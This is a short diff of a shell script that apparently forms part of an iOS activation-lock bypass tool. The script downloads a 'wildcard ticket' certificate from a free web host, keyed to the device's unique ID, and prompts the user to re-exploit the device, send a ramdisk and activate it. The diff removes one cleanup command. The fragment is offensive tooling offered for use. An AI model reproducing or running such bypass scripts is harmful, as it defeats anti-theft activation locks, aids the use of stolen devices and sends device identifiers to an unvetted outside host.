@@ -30,7 +30,6 @@ echo "EXTRACTING WILDCARD TICKET...";
 curl -s "https://brayanvilla.000webhostapp.com/home/css/$(DeviceInfo UniqueDeviceID)/Wildcard.der" --output $(DeviceInfo DeviceName)/Wildcard.der;     
 echo "SUCCESS!";
 echo "================";
-rm ic*
 ;;
 esac               
 read -p "NOW EXPLOIT DEVICE AGAIN, SEND RAMDISK AND PRESS ENTER FOR ACTIVATE DEVICE";
